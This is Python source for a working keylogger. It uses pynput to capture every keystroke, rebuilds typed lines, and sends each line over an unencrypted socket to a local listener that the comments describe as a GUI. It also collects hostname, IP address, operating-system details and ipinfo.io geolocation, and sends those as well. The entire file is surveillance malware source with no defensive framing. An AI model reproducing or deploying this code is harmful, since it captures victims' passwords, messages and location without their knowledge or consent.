from IPython.testing.tools import help_all_output_test
from pynput.keyboard import Key, Listener
import socket
import threading
import platform
import time
import pytest
import requests

# Function to send data to the GUI over a plain socket
def send_data_to_gui(data):
    try:
        with socket.create_connection(("127.0.0.1", 10000)) as sock:
            sock.sendall(data.encode())  # Send data without SSL encryption
            print(f"[+] Sent: {data}")
    except Exception as e:
        print(f"[!] Error sending data: {e}")

# Format key into readable string
def format_key(key):
    if key == Key.space:
        return " "
    elif key == Key.enter:
        return "\n"
    elif key == Key.backspace:
        return "[BACKSPACE]"
    elif isinstance(key, Key):
        return f"[{key.name.upper()}]"
    else:
        return str(key).replace("'", "")

# Function to send accumulated keystrokes to the GUI with timestamp
def send_current_char(char):
    if char.strip():  # Only send if it's not empty
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        send_data_to_gui(f"[{timestamp}] {char.strip()}")

# Function to send computer info and geo-location to GUI
def send_initial_data():
    computer_info = get_computer_info()
    geo_location = get_geo_location()

    # Send computer information to plaintextedit
    send_data_to_gui(f"COMPUTER_INFO: {computer_info}")

    # Send geo-location information to plaintextedit_2
    send_data_to_gui(f"GEO_LOCATION: {geo_location}")

# Function to retrieve computer information
def get_computer_info():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    system = platform.system()
    release = platform.release()
    version = platform.version()
    machine = platform.machine()
    processor = platform.processor()

    computer_info = (
        f"Hostname: {hostname}\n"
        f"IP Address: {ip_address}\n"
        f"Operating System: {system} {release}\n"
        f"OS Version: {version}\n"
        f"Machine: {machine}\n"
        f"Processor: {processor}\n"
    )
    return computer_info

# Function to retrieve geo-location information
def get_geo_location():
    try:
        response = requests.get("https://ipinfo.io/json")
        if response.status_code == 200:
            data = response.json()
            location = (
                f"IP Address: {data.get('ip')}\n"
                f"City: {data.get('city')}\n"
                f"Region: {data.get('region')}\n"
                f"Country: {data.get('country')}\n"
                f"Location (Lat, Long): {data.get('loc')}\n"
                f"Organization: {data.get('org')}\n"
            )
            return location
        else:
            return "Failed to get geo-location data."
    except Exception as e:
        return f"Error retrieving geo-location: {e}"

# Accumulate keystrokes as individual characters
current_char = ""

# Key press (optional if you prefer release only)
def on_press(key):
    pass  # You can log key press if needed

# Handle key release and update the current character
def on_release(key):
    global current_char

    formatted = format_key(key)

    if formatted == "\n":
        # When Enter key is pressed, send the character and start a new line
        send_current_char(current_char)
        current_char = ""  # Clear the current character after sending
    elif formatted == "[BACKSPACE]":
        # When backspace is pressed, remove the last character from the current character
        if current_char:
            current_char = current_char[:-1]  # Remove the last character
    else:
        # Otherwise, add the character to the current character string
        current_char += formatted

    # Debugging: print current character
    print(f"Current Character: {current_char}")

    if key == Key.esc:
        return False  # Stop listener on ESC

# Start listener and send initial data
def start_keylogger():
    # Send initial computer and geo-location info
    send_initial_data()

    # Start the listener in a separate thread so the GUI can update without blocking
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.daemon = True  # Ensure the listener thread ends when the main program exits
    listener_thread.start()

    # Keep the main program running while the listener runs in the background
    listener_thread.join()

# Start listener
def start_listener():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()